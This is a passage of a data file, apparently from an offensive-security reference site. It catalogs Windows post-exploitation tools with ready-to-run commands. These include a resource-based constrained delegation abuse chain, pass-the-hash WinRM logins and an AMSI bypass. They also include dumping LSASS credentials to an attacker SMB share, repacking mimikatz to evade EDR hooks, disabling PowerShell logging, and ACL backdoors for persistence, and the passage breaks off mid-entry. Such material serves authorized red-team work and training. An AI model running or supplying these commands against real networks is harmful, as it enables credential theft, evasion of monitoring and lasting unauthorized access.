              { label: "RBCD abuse chain (with bloodyAD for the AD-write step)", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add computer EVILPC 'Passw0rd123!'\nbloodyAD -d corp.local -u user -p pass --host <dc> add rbcd <target_computer> 'EVILPC$'\nRubeus.exe s4u /user:EVILPC$ /rc4:<evilpc_hash> /impersonateuser:administrator /msdsspn:cifs/<target_computer> /ptt" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Use a matching architecture build and run in-memory (execute-assembly, reflective loading) where possible — Rubeus is signatured almost as heavily as Mimikatz on a monitored endpoint.",
              "Prefer /aes over forcing RC4 in AES-enforced environments — an unexpected RC4 ticket request is itself a detection signal in some SIEM rulesets.",
              "/opsec and createnetonly exist specifically to make ticket injection look more like normal Windows behavior — use them rather than injecting straight into an interactive logon session when it matters.",
              "Combine with Certipy (PKINIT-based ticket requests from a certificate) or bloodyAD (the AD-write half of an RBCD chain) — Rubeus generally handles the Kerberos side, not the directory-write side."
            ]
          }
        ]
      },
      {
        id: "evil-winrm",
        name: "Evil-WinRM",
        url: "https://github.com/Hackplayers/evil-winrm",
        description: "Interactive WinRM shell for Windows targets — the standard way in once you have valid credentials.",
        brief: "Evil-WinRM is a ruby-based interactive shell over WinRM (ports 5985/5986) with built-in support for password, hash, and Kerberos authentication, plus quality-of-life features other WinRM clients don't have: file upload/download, in-memory .NET/PowerShell execution, and a built-in AMSI bypass helper. It's usually the first thing tried once a set of working credentials is confirmed against a Windows host.",
        quickReference: [
          { label: "Password auth", cmd: "evil-winrm -i <target> -u <user> -p <pass>" },
          { label: "Pass-the-hash", cmd: "evil-winrm -i <target> -u <user> -H <nt_hash>" },
          { label: "Force HTTPS (port 5986)", cmd: "evil-winrm -i <target> -u <user> -p <pass> -S" },
          { label: "Upload a file, from inside the shell", cmd: "upload /local/path/file.exe C:\\Windows\\Temp\\file.exe" },
          { label: "Bypass AMSI, from inside the shell", cmd: "Bypass-4MSI" }
        ],
        sections: [
          {
            title: "Authentication",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-i / --ip <target>", "Target host"],
              ["-u / --user <user>", "Username to authenticate as"],
              ["-p / --password <pass>", "Password authentication"],
              ["-H / --hash <nt_hash>", "Pass-the-hash — NT hash instead of a password"],
              ["-r / --realm <domain>", "Kerberos authentication, using a ticket already present in the environment (e.g. exported from Rubeus/Impacket and set via KRB5CCNAME)"],
              ["-S / --ssl", "Use HTTPS WinRM (port 5986) instead of plain HTTP (5985)"],
              ["-P / --port <port>", "Override the default WinRM port"],
              ["-c / --pub-key-cert & -k / --priv-key-cert", "Certificate-based authentication, when supported by the target"]
            ]
          },
          {
            title: "In-Shell Commands",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["upload <local> <remote>", "Upload a file to the target"],
              ["download <remote> <local>", "Download a file from the target"],
              ["menu", "List every Evil-WinRM built-in helper function available in the current session"],
              ["Bypass-4MSI", "Built-in AMSI patch — run before loading anything AMSI would otherwise flag"],
              ["Invoke-Binary <path> [args]", "Execute a local/remote .NET binary in memory, without writing it to disk on the target"],
              ["services", "List Windows services and their status from inside the shell"],
              ["dllloader <dll_path> <function>", "Load and invoke a specific function from an unmanaged DLL in memory"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard password-auth session, then upload + run a tool", cmd: "evil-winrm -i 10.10.10.10 -u jsmith -p 'Passw0rd123!'\n*Evil-WinRM* PS> upload /opt/tools/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe\n*Evil-WinRM* PS> Invoke-Binary /opt/tools/SharpHound.exe -c All" },
              { label: "Pass-the-hash session", cmd: "evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c" },
              { label: "Kerberos-ticket session (ticket obtained elsewhere)", cmd: "export KRB5CCNAME=/tmp/administrator.ccache\nevil-winrm -i dc01.corp.local -u administrator -r corp.local" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Requires WinRM to be enabled on the target and the authenticating account to be in the local Administrators or Remote Management Users group — a valid credential alone isn't sufficient if WinRM access hasn't been granted.",
              "Run Bypass-4MSI early in a session before loading anything that would normally trip AMSI on a Defender-enabled host.",
              "Invoke-Binary keeps tools off disk on the target, which matters far more on monitored hosts than on a lab box.",
              "-S / HTTPS is worth trying by default on hardened environments — some hosts disable plain HTTP WinRM entirely."
            ]
          }
        ]
      },
      {
        "id": "sharpup",
        "name": "SharpUp",
        "url": "https://github.com/GhostPack/SharpUp",
        "description": "C# port of PowerUp that audits a Windows host for common local privilege-escalation misconfigurations.",
        "brief": "SharpUp is GhostPack's C# port of PowerUp — it audits the local host for the classic Windows privilege-escalation vectors and reports the ones that are actionable: unquoted service paths, modifiable service binaries and service configurations, writable directories on %PATH%, AlwaysInstallElevated, modifiable scheduled tasks, and cached credentials. Run in memory via execute-assembly, it gives an operator a fast triage of how a low-privileged foothold can become SYSTEM.",
        "quickReference": [
          {
            "label": "Audit for privesc vectors",
            "cmd": "SharpUp.exe audit"
          },
          {
            "label": "Run in memory",
            "cmd": "execute-assembly /path/SharpUp.exe audit"
          },
          {
            "label": "Confirm a hit",
            "cmd": "accesschk.exe -uwcqv \"Everyone\" <service> /accepteula"
          }
        ],
        "sections": [
          {
            "title": "Checks run by audit",
            "type": "table",
            "columns": [
              "Vector",
              "What it flags"
            ],
            "rows": [
              [
                "Modifiable services / binaries",
                "A service you can reconfigure or whose binary you can overwrite"
              ],
              [
                "Unquoted service paths",
                "A path with a space that resolves an earlier token first"
              ],
              [
                "Modifiable scheduled tasks",
                "A task whose target script/binary is writable"
              ],
              [
                "AlwaysInstallElevated",
                "Both policy keys set, so an MSI installs with high privilege"
              ],
              [
                "Modifiable %PATH% / DLL paths",
                "A writable PATH dir a privileged process resolves first"
              ],
              [
                "Autorun registry keys",
                "A writable Run/Winlogon value used at logon"
              ],
              [
                "Cached credentials",
                "GPP cpassword, unattend.xml, McAfee SiteList and similar files"
              ]
            ]
          },
          {
            "title": "Usage (via Sliver execute-assembly)",
            "type": "commands",
            "commands": [
              {
                "label": "Run the audit",
                "cmd": "execute-assembly -p explorer.exe -t 180 '/path/SharpUp.exe' 'audit'\n# flags e.g. an unquoted service path, a modifiable service binary/config,\n# writable %PATH% dirs, AlwaysInstallElevated, modifiable scheduled tasks\n# (exploiting a flagged vector is covered in Vulns -> Windows Service Privilege Escalation)"
              }
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Read-only: it reports vectors, it does not change anything. Confirm each hit by hand (accesschk / icacls) before relying on it.",
              "Each finding lines up with a stage of the Windows Privilege Escalation map; pair with winPEAS or PrivescCheck for breadth."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "SharpUp — GitHub (GhostPack)",
                "url": "https://github.com/GhostPack/SharpUp"
              },
              {
                "label": "Vulns — Windows Service Privilege Escalation",
                "url": "vulns.html"
              }
            ]
          }
        ]
      },
      {
        "id": "seatbelt",
        "name": "Seatbelt",
        "url": "https://github.com/GhostPack/Seatbelt",
        "description": "C# host-survey tool that gathers security-relevant system and user configuration for situational awareness.",
        "brief": "Seatbelt is GhostPack's C# situational-awareness tool. It runs a large set of host survey checks — security products and their configuration, patch level, logging and AMSI state, network configuration, credentials in files and the registry, browser data, and more — grouped so an operator can pull just what they need (-group=system, -group=user, -group=remote). It is the standard first look at a new host, run in memory via execute-assembly.",
        "quickReference": [
          {
            "label": "System survey",
            "cmd": "Seatbelt.exe -group=system"
          },
          {
            "label": "User survey",
            "cmd": "Seatbelt.exe -group=user"
          },
          {
            "label": "Everything",
            "cmd": "Seatbelt.exe -group=all"
          }
        ],
        "sections": [
          {
            "title": "Key groups & flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-group=all",
                "Every check (thorough, noisier)"
              ],
              [
                "-group=system",
                "OS/security posture: patches, AV, UAC, LSA, firewall, AppLocker"
              ],
              [
                "-group=user",
                "Current user's artefacts: saved sessions, history, tokens"
              ],
              [
                "-group=remote",
                "Only checks meaningful against a remote host"
              ],
              [
                "+<Command>",
                "Run one check, e.g. +TokenPrivileges, +LAPS, +Hotfixes"
              ],
              [
                "-full",
                "Don't truncate long results"
              ],
              [
                "-outputfile=\"C:\\Temp\\sb.txt\"",
                "Write results to a file"
              ],
              [
                "-computername= -username= -password=",
                "Target a remote host with explicit creds"
              ]
            ]
          },
          {
            "title": "Usage (via Sliver execute-assembly)",
            "type": "commands",
            "commands": [
              {
                "label": "Run grouped host surveys",
                "cmd": "execute-assembly -p explorer.exe -t 180 '/path/Seatbelt.exe' '-group=system'\nexecute-assembly -p explorer.exe -t 180 '/path/Seatbelt.exe' '-group=user'\n# individual checks are also callable by name, e.g. 'AMSIProviders' 'PowerShell' 'TokenPrivileges'"
              }
            ]
          },
          {
            "title": "Notes",
            "type": "notes",
            "items": [
              "Reads AMSI/logging configuration among much else — useful for confirming what host telemetry is in play before running noisier tools.",
              "For PowerShell-based checks under heavy logging, Stracciatella can run equivalent scripts with AMSI/script-block logging patched."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Seatbelt — GitHub (GhostPack)",
                "url": "https://github.com/GhostPack/Seatbelt"
              }
            ]
          }
        ]
      },
      {
        "id": "lacheck",
        "name": "LACheck",
        "url": "https://github.com/vivami/LACheck",
        "description": "Multithreaded C# local-admin and session checker for mapping where an account has admin rights across many hosts.",
        "brief": "LACheck is a multithreaded C# tool that checks, across a list of hosts, where the current (or a specified) account has local administrator access, and can surface logged-on sessions — including hunting for a Domain Admin session to target. It feeds the 'derivative local admin' picture that BloodHound builds on and is used in memory via execute-assembly to plan lateral movement and privilege escalation.",
        "quickReference": [
          {
            "label": "Check local admin across hosts",
            "cmd": "LACheck.exe smb /targets:hosts.txt /threads:20"
          },
          {
            "label": "Find logged-on (DA) sessions",
            "cmd": "LACheck.exe smb /targets:hosts.txt /loggedon"
          },
          {
            "label": "Scan a host list, more threads",
            "cmd": "LACheck.exe smb /targets:hosts.txt /threads:50"
          }
        ],
        "sections": [
          {
            "title": "Usage",
            "type": "table",
            "columns": [
              "Token",
              "Description"
            ],
            "rows": [
              [
                "<method> (e.g. smb)",
                "Check method used to test for local-admin rights"
              ],
              [
                "/targets:<file>",
                "File of hosts to test"
              ],
              [
                "/threads:<n>",
                "Concurrency"
              ],
              [
                "/loggedon",
                "Also report logged-on users / sessions on each host"
              ]
            ]
          },
          {
            "title": "Usage (via Sliver execute-assembly)",
            "type": "commands",
            "commands": [
              {
                "label": "Map local-admin access and sessions",
                "cmd": "execute-assembly -p explorer.exe -t 120 '/path/LACheck.exe' 'smb /targets:hosts.txt /threads:20'\nexecute-assembly -p explorer.exe -t 120 '/path/LACheck.exe' 'smb /targets:hosts.txt /loggedon'"
              }
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Quickly maps where your current credentials already have local admin across many hosts — read the wins off a host list without full BloodHound collection.",
              "/loggedon highlights where a high-privilege user is signed in: the box worth targeting next."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "LACheck — GitHub",
                "url": "https://github.com/vivami/LACheck"
              },
              {
                "label": "Toolkit — BloodHound",
                "url": "toolkit.html"
              }
            ]
          }
        ]
      },
      {
        "id": "cimplant",
        "name": "CIMplant",
        "url": "https://github.com/FortyNorthSecurity/CIMplant",
        "description": "C# port of WMImplant — query systems and run commands over WMI/CIM for enumeration and lateral movement.",
        "brief": "CIMplant is a C# reimplementation of WMImplant that uses WMI (and DCOM/CIM) to gather information from and execute commands on remote Windows hosts, authenticating with supplied credentials. Because WMI is a normal management protocol, it blends into expected traffic; run in memory via execute-assembly it provides enumeration (basic_info, process listing) and command execution (command_exec) for lateral movement without SMB/PsExec-style artefacts.",
        "quickReference": [
          {
            "label": "Host info over WMI",
            "cmd": "CIMplant.exe -s <host> -u <user> -p <pass> -d <domain> -c basic_info"
          },
          {
            "label": "Run a command",
            "cmd": "CIMplant.exe -s <host> -u <user> -p <pass> -c command_exec --execute \"whoami\""
          },
          {
            "label": "List processes over WMI",
            "cmd": "CIMplant.exe -s <host> -u <u> -p <p> -c ps"
          }
        ],
        "sections": [
          {
            "title": "Flags & key commands",
            "type": "table",
            "columns": [
              "Item",
              "Description"
            ],
            "rows": [
              [
                "-s <host> / -u / -d / -p",
                "Target host and credentials"
              ],
              [
                "-c <command>",
                "Operation: basic_info, command_exec, ps, cat, ls, download, upload, ..."
              ],
              [
                "--execute \"<cmd>\"",
                "The command line used by command_exec"
              ],
              [
                "-m wmi|dcom",
                "Connection method"
              ],
              [
                "--nops",
                "Run command_exec via Win32_Process instead of a PowerShell runspace"
              ],
              [
                "reg_mod / service_mod / logon_events",
                "Registry & service changes, and logon-session enumeration"
              ]
            ]
          },
          {
            "title": "Usage (via Sliver execute-assembly)",
            "type": "commands",
            "commands": [
              {
                "label": "Enumerate a remote host",
                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' '-s <host> -u <user> -p <pass> -d <domain> -c basic_info'"
              },
              {
                "label": "Execute a command remotely",
                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' '-s <host> -u <user> -p <pass> -c command_exec --execute \"whoami\"'"
              }
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "C# port of WMImplant: everything rides WMI/CIM, so there is no new service or SMB file write — useful where service-based exec is watched.",
              "Packed into one assembly for execute-assembly; PowerShell-backed commands still touch the CLR, so pair with an AMSI bypass on monitored hosts."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "CIMplant — GitHub (FortyNorthSecurity)",
                "url": "https://github.com/FortyNorthSecurity/CIMplant"
              },
              {
                "label": "Vulns — Remote Execution / Lateral Movement",
                "url": "vulns.html"
              }
            ]
          }
        ]
      },
      {
        "id": "minidumpdotnet",
        "name": "minidumpdotnet",
        "url": "https://github.com/pheepheep/minidumpdotnet",
        "description": "Managed .NET tool that dumps process memory (LSASS) via a custom MiniDumpWriteDump implementation to evade EDR hooks.",
        "brief": "minidumpdotnet is a .NET tool that produces a minidump of a target process — typically LSASS — using its own implementation of the MiniDumpWriteDump() routine rather than the well-hooked API in dbghelp.dll. That custom implementation is what lets it evade endpoint products (e.g. Microsoft Defender for Endpoint) that hook the standard call. It is paired with a helper such as FindLSASSPID to locate the LSASS process, and is best run from an SMB share (not over HTTP) to reduce detection; the resulting dump is parsed offline with mimikatz/pypykatz.",
        "quickReference": [
          {
            "label": "Find the LSASS PID",
            "cmd": "FindLSASSPID.exe"
          },
          {
            "label": "Dump LSASS to a share",
            "cmd": "minidumpdotnet.exe <pid> \\\\host\\share\\lsass.dmp"
          },
          {
            "label": "Parse the dump off-host",
            "cmd": "pypykatz lsa minidump out.dmp"
          }
        ],
        "sections": [
          {
            "title": "Usage",
            "type": "table",
            "columns": [
              "Command",
              "Description"
            ],
            "rows": [
              [
                "FindLSASSPID.exe",
                "Helper that prints the current LSASS PID"
              ],
              [
                "minidumpdotnet.exe <pid> <outfile>",
                "Write a full minidump of <pid> to <outfile>"
              ],
              [
                "<outfile> = \\\\host\\share\\out.dmp",
                "Write straight to an attacker SMB share so nothing lands on the target disk"
              ]
            ]
          },
          {
            "title": "Usage (run from an SMB share)",
            "type": "commands",
            "commands": [
              {
                "label": "1. Host the tools on an SMB share",
                "cmd": "mkdir 'C:\\Tools\\<share>'\nexecute -o -t 40 cmd /c \"net share <share>=C:\\Tools\\<share> /grant:Everyone,FULL\"\nupload -t 180 '/path/minidumpdotnet.exe' '\\\\host\\<share>\\minidumpdotnet.exe'\nupload -t 180 '/path/FindLSASSPID.exe'  '\\\\host\\<share>\\FindLSASSPID.exe'"
              },
              {
                "label": "2. Find the PID and dump LSASS to the share",
                "cmd": "# run FindLSASSPID to get the PID, then dump straight to the share (avoid HTTP):\nminidumpdotnet.exe <pid> \\\\host\\<share>\\lsass.dmp\n# parse offline: mimikatz 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords'"
              }
            ]
          },
          {
            "title": "Why It Evades EDR",
            "type": "notes",
            "items": [
              "The common LSASS-dump detections hook the MiniDumpWriteDump() API in dbghelp.dll and flag any caller opening a handle to LSASS and writing a dump. minidumpdotnet reimplements the dump logic itself, so it never calls the hooked API — the behaviour the sensor keys on doesn't occur through the monitored path.",
              "Running it from an SMB share rather than fetching over HTTP avoids the web-download detection surface and keeps the tool off local disk.",
              "It still needs the SeDebugPrivilege / admin context to open LSASS, so it follows a privilege-escalation step."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "minidumpdotnet — GitHub",
                "url": "https://github.com/pheepheep/minidumpdotnet"
              },
              {
                "label": "Vulns — LSASS Dumping",
                "url": "vulns.html"
              }
            ]
          }
        ]
      },
      {
        "id": "pezor",
        "name": "PEzor",
        "url": "https://github.com/phra/PEzor",
        "description": "Open-source PE/shellcode packer that adds evasion (unhooking, anti-debug, sleep, .NET output) to existing tools.",
        "brief": "PEzor is an open-source packer that takes an existing PE or raw shellcode and wraps it with evasion features so a signatured tool (mimikatz, a C2 loader) can run past AV/EDR. It can unhook ntdll to defeat userland API hooks, add anti-debug and memory-permission fluctuation, insert sleeps, and — importantly for C2 workflows — emit a .NET assembly (-format=dotnet) so the packed tool can be launched with execute-assembly. Internally it leans on donut for the PE-to-shellcode conversion.",
        "quickReference": [
          {
            "label": "Pack a PE to an unhooked .NET assembly",
            "cmd": "./PEzor.sh -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 <input.exe>"
          },
          {
            "label": "Pass args (e.g. mimikatz)",
            "cmd": "... <mimikatz.exe> -z 2 -b 1 -p '\"privilege::debug\" \"sekurlsa::ekeys\" \"exit\"'"
          },
          {
            "label": "Pack to raw shellcode",
            "cmd": "./PEzor.sh -format=shellcode -unhook -antidebug input.exe"
          }
        ],
        "sections": [
          {
            "title": "Key flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-format=<fmt>",
                "Output: exe, dll, reflective-dll, service-exe, service-dll, dotnet, ..."
              ],
              [
                "-unhook",
                "Restore ntdll (remove user-land API hooks) at runtime"
              ],
              [
                "-antidebug",
                "Add anti-debug checks"
              ],
              [
                "-syscalls",
                "Use raw syscalls (x64, Windows 10)"
              ],
              [
                "-sgn",
                "Encode the embedded shellcode with sgn"
              ],
              [
                "-self",
                "Run the payload in the same thread"
              ],
              [
                "-sleep=N",
                "Delay N seconds before unpacking"
              ],
              [
                "-fluctuate=RW|NA",
                "Flip payload memory to RW / NoAccess during the sleep"
              ],
              [
                "-xorkey=KEY",
                "XOR-encrypt the payload; key derived from the hostname at runtime"
              ],
              [
                "-z <n> / -b <n>",
                "Passthrough packing level / bypass level"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Repack mimikatz for in-memory use",
                "cmd": "./PEzor.sh -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 \\\n  /path/mimikatz.exe -z 2 -b 1 -p '\"privilege::debug\" \"token::elevate\" \"sekurlsa::ekeys\" \"exit\"'\n# output: mimikatz.exe.packed.dotnet.exe -> rename per task (-ekeys / -dcsync / -vaultcred)\nexecute-assembly -p explorer.exe -t 180 '/path/mimikatz-ekeys.exe.packed.dotnet.exe'"
              }
            ]
          },
          {
            "title": "Why It Works",
            "type": "notes",
            "items": [
              "EDRs commonly detect offensive tools two ways: static signatures on the file, and userland hooks placed in ntdll that intercept sensitive API calls. PEzor addresses both — packing/encoding changes the static bytes, and -unhook restores a clean copy of ntdll from disk so the process's syscalls are no longer routed through the vendor's inline hooks.",
              "Anti-debug and memory-permission fluctuation (-fluctuate) reduce the window in which the decrypted payload is scannable in memory, and the sleep delays execution past some sandbox timeouts.",
              "-format=dotnet produces an assembly that execute-assembly can run entirely in memory, so the repacked tool never touches disk on the target.",
              "This is why a tool as heavily signatured as mimikatz can still be run: the detection surfaces PEzor targets (file signature + API hooks) are exactly the ones that would otherwise flag it."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "PEzor — GitHub (phra)",
                "url": "https://github.com/phra/PEzor"
              },
              {
                "label": "Theory — In-Memory Post-Exploitation Tradecraft",
                "url": "theory/2026-09-23-in-memory-tradecraft.html"
              }
            ]
          }
        ]
      },
      {
        "id": "invisi-shell",
        "name": "Invisi-Shell",
        "url": "https://github.com/OmerYa/Invisi-Shell",
        "description": "Wrapper that launches PowerShell with logging and AMSI defenses neutralised for the session.",
        "brief": "Invisi-Shell is a helper that spawns a PowerShell instance with the common script-oriented defenses bypassed for that session — Script Block and Module logging, transcription, PSReadline history, and AMSI. It works by hijacking the COM/registry references the runtime resolves at start-up (a non-admin registry variant and an admin PATH variant), so the operator gets a 'quiet' PowerShell without hand-rolling each bypass. It is the standard first step before running PowerShell tooling on a monitored host.",
        "quickReference": [
          {
            "label": "Non-admin launch",
            "cmd": "C:\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat"
          },
          {
            "label": "Admin launch",
            "cmd": "C:\\Tools\\InviShell\\RunWithPathAsAdmin.bat"
          },
          {
            "label": "Then import tooling normally",
            "cmd": "PS> Import-Module .\\PowerView.ps1"
          }
        ],
        "sections": [
          {
            "title": "What it neutralises",
            "type": "table",
            "columns": [
              "Defence",
              "Effect in the session"
            ],
            "rows": [
              [
                "AMSI",
                "Scripts/assemblies are no longer scanned"
              ],
              [
                "Script Block Logging (4104)",
                "Not recorded"
              ],
              [
                "Module Logging (4103)",
                "Not recorded"
              ],
              [
                "Transcription",
                "Disabled"
              ],
              [
                "ETW (PowerShell provider)",
                "Patched via a CLR profiler loaded before PowerShell starts"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Start a quiet PowerShell, then run tooling",
                "cmd": "# non-admin context:\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n# admin context:\nC:\\AD\\Tools\\InviShell\\RunWithPathAsAdmin.bat\n# exit returns to the parent shell (restoring the hijacked references)"
              }
            ]
          },
          {
            "title": "Why It Works",
            "type": "notes",
            "items": [
              "AMSI and ETW-based logging are resolved by the .NET/PowerShell runtime through COM and registry references at start-up. Invisi-Shell registers its own entries so the runtime binds to a no-op implementation for the child process — no in-memory patching of AMSI is needed because the provider is never wired up in the first place.",
              "It only affects the session it launches; parent and sibling processes keep their normal logging, which limits the footprint.",
              "The controls it neutralises are described on the Windows Telemetry theory page — Invisi-Shell is the automation of those bypasses."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Invisi-Shell — GitHub (OmerYa)",
                "url": "https://github.com/OmerYa/Invisi-Shell"
              },
              {
                "label": "Theory — Windows Telemetry & PowerShell Logging",
                "url": "theory/2026-09-23-windows-telemetry-logging.html"
              }
            ]
          }
        ]
      },
      {
        "id": "stracciatella",
        "name": "Stracciatella",
        "url": "https://github.com/mgeeky/Stracciatella",
        "description": "Runs PowerShell scripts through a custom runspace with AMSI, Script Block logging and transcription patched out.",
        "brief": "Stracciatella executes PowerShell within a custom .NET runspace that has AMSI, Script Block logging and transcription disabled, and is itself distributed as a .NET assembly so it can run in memory via execute-assembly. It fills the gap where a technique only exists as a PowerShell script (no C# port) but the host is monitored — the script runs inside Stracciatella's clean runspace rather than the instrumented default one.",
        "quickReference": [
          {
            "label": "Run a command",
            "cmd": "Stracciatella.exe -c \"whoami; Get-Process\""
          },
          {
            "label": "Run a script",
            "cmd": "Stracciatella.exe -s .\\PowerView.ps1"
          },
          {
            "label": "Stealthier (leave CLM alone, no artefacts)",
            "cmd": "Stracciatella.exe -C -c \"<command>\""
          }
        ],
        "sections": [
          {
            "title": "Key flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-s <path>",
                "Run a PowerShell script file"
              ],
              [
                "-c \"<cmd>\"",
                "Run the given command(s)"
              ],
              [
                "-e",
                "Treat the input command as encoded"
              ],
              [
                "-x <key>",
                "Input is XOR-encoded (one-byte key)"
              ],
              [
                "-p <name>",
                "Read commands from a named pipe"
              ],
              [
                "-t <ms>",
                "Timeout in milliseconds"
              ],
              [
                "-C",
                "Don't disable Constrained Language Mode (stealthier, no artefacts)"
              ],
              [
                "-n",
                "Don't clean up CLM-disable leftovers"
              ],
              [
                "-f",
                "Proceed even if the defences were not disabled"
              ]
            ]
          },
          {
            "title": "Usage (via Sliver execute-assembly)",
            "type": "commands",
            "commands": [
              {
                "label": "Clean interactive runspace",
                "cmd": "Stracciatella.exe        # a PowerShell runspace with AMSI / 4104 / transcription off"
              },
              {
                "label": "One command or a script",
                "cmd": "Stracciatella.exe -c \"<command>\"\nStracciatella.exe -s .\\script.ps1"
              }
            ]
          },
          {
            "title": "Why It Works",
            "type": "notes",
            "items": [
              "PowerShell's AMSI and logging are properties of the runspace/engine that hosts the script. Stracciatella creates its own runspace with those features turned off before any script runs, so the script executes in an environment that was never instrumented, rather than trying to disable instrumentation after the fact.",
              "Being a .NET assembly, it runs entirely in memory through execute-assembly — no PowerShell.exe process and no script on disk."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Stracciatella — GitHub (mgeeky)",
                "url": "https://github.com/mgeeky/Stracciatella"
              },
              {
                "label": "Theory — Windows Telemetry & PowerShell Logging",
                "url": "theory/2026-09-23-windows-telemetry-logging.html"
              }
            ]
          }
        ]
      },
      {
        "id": "race-toolkit",
        "name": "RACE",
        "url": "https://github.com/samratashok/RACE",
        "description": "PowerShell toolkit for stealthy AD persistence and privilege escalation by editing security descriptors (WMI, PSRemoting, registry).",
        "brief": "RACE (Reconfigure ACLs in the Cloud/Enterprise) is a PowerShell toolkit that abuses Windows security descriptors for stealthy persistence and privilege escalation. Its Set-RemoteWMI and Set-RemotePSRemoting functions grant a chosen low-privileged user remote code-execution rights by editing the DACLs on the WMI namespace and the WinRM endpoint — a file-less, account-less backdoor. To run it from a C2 that prefers .NET, RACE.ps1 is made executable (appending a call and compiling with PS2EXE) so it can go through execute-assembly.",
        "quickReference": [
          {
            "label": "Backdoor remote WMI",
            "cmd": "Set-RemoteWMI -SamAccountName <user> -ComputerName <host> -namespace 'root\\cimv2'"
          },
          {
            "label": "Backdoor PSRemoting",
            "cmd": "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host>"
          },
          {
            "label": "Revert",
            "cmd": "... -Remove"
          }
        ],
        "sections": [
          {
            "title": "Functions",
            "type": "table",
            "columns": [
              "Function",
              "What it backdoors"
            ],
            "rows": [
              [
                "Set-RemotePSRemoting",
                "PS Remoting ACL so a non-admin can connect"
              ],
              [
                "Set-RemoteWMI",
                "A WMI namespace ACL (e.g. -namespace root\\cimv2)"
              ],
              [
                "Set-RemoteRegistryPermissions",
                "Remote-registry ACLs"
              ],
              [
                "Set-RemoteServicePermissions / Set-RemoteServiceAbuse",
                "A service DACL, then abuse it"
              ],
              [
                "Set-DCOMPermissions / Invoke-DCOMAbuse",
                "DCOM access for a non-admin, then abuse it"
              ],
              [
                "Set-DCPermissions -Method AdminSDHolder|RBCD",
                "DC-level persistence via object ACLs"
              ],
              [
                "Set-DCShadowPermissions",
                "Rights needed to run DCShadow"
              ],
              [
                "Common params",
                "-SamAccountName -ComputerName -Credential -Remove (revert)"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Grant a low-priv user remote WMI / PSRemoting",
                "cmd": "# compile RACE.ps1 -> .NET (PS2EXE) and run via execute-assembly, or run in a Stracciatella runspace:\nSet-RemoteWMI      -SamAccountName <user> -ComputerName <dc> -namespace 'root\\cimv2' -Verbose\nSet-RemotePSRemoting -SamAccountName <user> -ComputerName <dc> -Verbose"
              },
              {
                "label": "Return later as the low-priv user",
                "cmd": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd /c ...\" -ComputerName <dc>\nEnter-PSSession -ComputerName <dc>"
              }
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "These are security-descriptor (SDDL) edits, not new accounts or binaries — they are quiet and survive password resets, which is what makes them good persistence.",
              "Setting a backdoor needs admin on the target; -Remove reverts the ACL. Detection: monitor ACL changes on WMI/PSRemoting/registry and on AdminSDHolder."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "RACE — GitHub (samratashok)",
                "url": "https://github.com/samratashok/RACE"
              },
              {
                "label": "Vulns — Security Descriptor / ACL Backdoors",
                "url": "vulns.html"
              }
            ]
          }
        ]
      },
      {
        "id": "ps2exe",
        "name": "PS2EXE",
        "url": "https://github.com/MScholtes/PS2EXE",
        "description": "Compiles a PowerShell script into a .NET executable — used to bridge PowerShell-only tools into execute-assembly.",
        "brief": "PS2EXE compiles a PowerShell script into a self-contained .NET executable. On a Sliver engagement its value is as a bridge: techniques that only exist as PowerShell (PowerUpSQL's link crawl, the RACE toolkit) are turned into .NET assemblies that execute-assembly can run in memory, so the operator keeps the in-memory, no-PowerShell.exe workflow even for script-only tooling. The script is usually made 'executable' first by appending the function call that does the work.",
        "quickReference": [
          {
            "label": "Compile a script to EXE",
            "cmd": "ps2exe.ps1 -inputFile <in.ps1> -outputFile <out.exe> -x64 -sta"
          },
          {
            "label": "GUI, no console",
            "cmd": "ps2exe.ps1 -inputFile t.ps1 -outputFile t.exe -noConsole -x64"
          },
          {
            "label": "Run it in memory",
            "cmd": "execute-assembly /path/t.exe"
          }
        ],
        "sections": [
          {
            "title": "Key flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
